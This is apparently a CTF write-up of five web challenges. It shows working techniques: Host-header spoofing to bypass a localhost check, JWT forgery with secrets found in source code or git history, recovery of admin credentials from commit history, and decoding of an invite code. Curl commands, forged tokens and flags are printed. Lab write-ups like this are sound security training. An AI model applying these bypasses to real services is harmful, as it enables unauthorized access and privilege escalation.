# Protecting Camp - Easy
## Description
<sup>Author: @soups71</sup><br>

I made a small site to keep a list of things I need to buy to keep me safe before I go camping, maybe it's keeping some other things safe too!

Psst... Snyk can help solve this challenge! Try it out!

Press the Start button in the top right to begin this challenge.
Connect with:
	http://challenge.ctf.games:31777
**Attachments:** [protecting_camp.zip](/assets/files/protecting_camp.zip)
## Solution
`index.js` inside `protecting_camp.zip`
```js
app.get('/api/flag',  (req, res) => {
    var url = req.protocol + '://' + req.get('host') + req.originalUrl;
    try{
        parsed = parseUrl(url)
        if (parsed.resource != '127.0.0.1'){
            res.send("Hey... what's going on here\n");
        }else{
            fs.readFile("./flag.txt", 'utf8', (err, data) => {
                if (err) {
                    res.send("There was an error and this is sad :(\n")
            
                }else{
                    res.send(data+"\n")
                }
            });
    }} catch (error) {
        res.status(400).json({ success: false, message: 'Error parsing URL' });
    }   
});
```
If I request `/api/flag`. I get this response.
```bash
$ curl http://challenge.ctf.games:31777/api/flag     
Hey... what's going on here
```
So I need to trick a website that the request comes from localhost according to `if (parsed.resource != '127.0.0.1')`.
```bash
$ curl -H 'HOST: 127.0.0.1' http://challenge.ctf.games:31777/api/flag
flag{d716dd8ab70bbc51a5f1d0182c84bcc8}
```

> Flag: flag{d716dd8ab70bbc51a5f1d0182c84bcc8}
--- 
# Jott - Easy
## Description
<sup>Author: @HuskyHacks</sup><br>

Jott is the new hottness of productivity applications! Collaborate in real time, share notes, take notes, or don't take notes! We're not your manager. We're not even a real company!  
  
Go ahead and pentest the application and jott down whatever you find.  
  
We'd like you to do a pretty thorough job, so we've outfitted you with a dev instane of the app. Please use these user level credentials to log in and perform an aunthenticated test.  
  
**Username-** john_doe  
**Password** - password123  
  
We also gave you the dev-build of the app in the src directory for reference.  
  
**Press the `Start` button on the top-right to begin this challenge.** Psst, Snyk can help solve this challenge! [Try Snyk!](https://docs.snyk.io/)

**Connect with:**  

- [http://challenge.ctf.games:31399](http://challenge.ctf.games:31399/)

**Attachments:**  [src.zip](/assets/files/src.zip)
## Solution
1. Login with credential that the challenge gives.
![[Jott]](/assets/images/Jott.png)
2. After that, I checked the cookies in this website and found `JWT` cookies.<br>`JWT=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJqb2huX2RvZSIsInJvbGUiOiJ1c2VyIn0.pNGsWOaNM05ak48_gkmNBuHjIHLQr6LP7G4hWeue_0k`
3. Decode `JWT` cookie wit https://jwt.io/: <br>![[Jott1]](/assets/images/Jott1.png)
4. In `Payload` session, There are `sub` and `role`. I have to change the `"role":"user"`  to `"role":"admin"` to get the flag. And I need the secret key to encode my new token. `SECRET_KEY = "jott123!"` the secret key can be found in the source code.
```python
@app.route('/dashboard')
def dashboard():
    token = request.cookies.get('jwt')    
    if not token:
        return redirect('/login')

    try:
        # Decoding the token
        decoded_token = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        username = decoded_token.get("sub")
        user_notes = users_notes.get(username, [])
        if decoded_token.get('role') == 'admin':
            # Read the content of 'flag.txt'
            with open('flag.txt', 'r') as file:
                flag_content = file.read()
            return render_template('admin_dashboard.html', flag=flag_content)
        else:
            return render_template('user_dashboard.html', notes=user_notes)
    except jwt.ExpiredSignatureError:
        return redirect('/login')
    except jwt.InvalidTokenError:
        return redirect('/login')
```
5. Change `JWT` cookie to the new one ![[Jott3]](/assets/images/Jott3.png)`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJqb2huX2RvZSIsInJvbGUiOiJhZG1pbiJ9.MadImr4OZn1SHxbQMIs7PQ4OV7VBAFkDpIHuqv3am_c`<br>DONE!![[Jott4]](/assets/images/Jott4.png)

>Flag: flag{c7cc7fa86330cff2c09cea0055289b7e}
---
# Unhackable Andy - Easy
## Description
<sup>Author: @HuskyHacks</sup><br>

Someone might want to let ol' Andy know the old addage - pride goeth before the fall.

Press the Start button on the top-right to begin this challenge.
Connect with:
	http://challenge.ctf.games:31244
Please allow up to 30 seconds for the challenge to become available.
## Solution
![[Unhackable1]](/assets/images/Unhackable1.png)There is his GitHub in the website, Let's check it up.
![[Unhackable2]](/assets/images/Unhackable2.png)In `app.py`, The website get username and password from `env`. So we need to find `env` file.
![[Unhackable3]](/assets/images/Unhackable3.png)But there isn't `env` file in GitHub repository. Look carefully at commits history.
![[Unhackable4]](/assets/images/Unhackable4.png)
```
ADMIN_USERNAME=unhackableandy	
ADMIN_PASSWORD=ThisIsASUPERStrongSecuredPasswordAndIAMUNHACKABLEANDYYYYBOIIIII133742069LOLlolLOL	
```
use this credential to login and then run `cat flag.txt` in shell box.
![[Unhackable5]](/assets/images/Unhackable5.png)

> Flag: flag{e81b8885d8a5e8d57bbadeb124cc956b}
---
# Back the Hawks - Easy
## Description
<Sup>Author: @HuskyHacks</sup>
We are Back the Hawks! We're a non-profit that seeks to protect hawks across the world. We have a vibrant community of Backers who are all passionate about Backing the Hawks! We'd love for you to join us... if you can figure out how to get an access code.  
  
NOTE - any resemblence to other companies, non-profits, services, login portal challenges, and/or the like, living or dead, is completely coincidental.  
  
**Press the `Start` button on the top-right to begin this challenge.**
**Connect with:**  
	[http://challenge.ctf.games:31441](http://challenge.ctf.games:31441/)
## Solution
![[Hawks]](/assets/images/Hawks.png)I need to find Access Code to register. Hint: The JavaScript of this page is doing something interesting. Let's check it.
![[Hawks1]](/assets/images/Hawks1.png)In `backTheHawksInviteCodes.min.js` There is a function `makeInviteCode()`. Let's call this function.
![[Hawks2]](/assets/images/Hawks2.png)It tells me to send request to `/back/the/hawks/invite/code` with POST method.
```
$ curl -X POST http://challenge.ctf.games:31441/back/the/hawks/invite/code
{"hint":"this message is encrypted, there's no way to break it! Forget about backing the hawks. Your journey ends here.","message":"TB_LRQ_EBOB_YXZHFK_QEB_EXTHP_2023"}
```
`TB_LRQ_EBOB_YXZHFK_QEB_EXTHP_2023` I use https://cryptii.com/pipes/caesar-cipher to decoder the invite code.
![[Hawks3]](/assets/images/Hawks3.png)Invite Code: `WE_OUT_HERE_BACKIN_THE_HAWKS_2023`
after I submit `WE_OUT_HERE_BACKIN_THE_HAWKS_2023` as invite code to register. Got the flag!
![[Hawks4]](/assets/images/Hawks4.png)

>Flag: flag{3ef532159716ecfb9117f56f4ead4fb6}
---

# Repo Recon - Medium
## Description
<sup>Author: @mowzer</sup><br>
  
Leak Leak Leak  
  
Can you find the secret leak?  
  
Psst... Snyk can help solve this challenge! [Try it out!](https://snyk.co/uf6Kk)  
  
**Press the `Start` button on the top-right to begin this challenge.**
**Connect with:**  
	[http://challenge.ctf.games:30787](http://challenge.ctf.games:30787/)
## Solution
![[RepoRecon]](/assets/images/RepoRecon.png)
Click `Explore our Code` to see maybe source code of this page. It direct me to GitHub repository https://github.com/mowzk/repo-recon. 
after a while I understood all repo. The website want me a `JWT` toekn that sign with `JWT_SECRET`(get from `.env` file in commits history) and the website take token via the cookie name `auth_token`. Let's find it in history commits. There are **5,005** commits. The best way is using git to clone  this repository to local machine and use `git` command to show all commits content and grep `JWT_SECRET` strings.
```bash
$ git clone https://github.com/mowzk/repo-recon.git
$ cd repo-recon
$ git log --patch | grep JWT_SECRET
-JWT_SECRET=18b471a7d39b001bf79f12ab952f1364
+JWT_SECRET=18b471a7d39b001bf79f12ab952f1364
+const JWT_SECRET = process.env.JWT_SECRET;
+      const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '1h' });
+        jwt.verify(token, JWT_SECRET);
```

**`JWT_SECRET=18b471a7d39b001bf79f12ab952f1364`**
Next, sign jwt cookie with the same command that the server use. `jwt.sign({ username }, JWT_SECRET, { expiresIn: '1h' });`(in `server.js` line 25). I use https://replit.com/ to run javascript.
![[RepoRecon1]](/assets/images/RepoRecon1.png)
JWT token: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjk4NzQ4MzU0LCJleHAiOjE2OTg3NTE5NTR9.MorjJqG-LCtHsUOv4ceb8gSnQoHbINwHSUCRao9nVdM`. 
Let's request to `/flag`(found in `server.js`) with the JWT token to get the flag
```bash
$ curl -b "auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjk4NzQ4MzU0LCJleHAiOjE2OTg3NTE5NTR9.MorjJqG-LCtHsUOv4ceb8gSnQoHbINwHSUCRao9nVdM" http://challenge.ctf.games:30736/flag
{"success":true,"flag":"flag{8ee442003863b85514585c598a6a628b}"}
```

>Flag: flag{8ee442003863b85514585c598a6a628b}
---
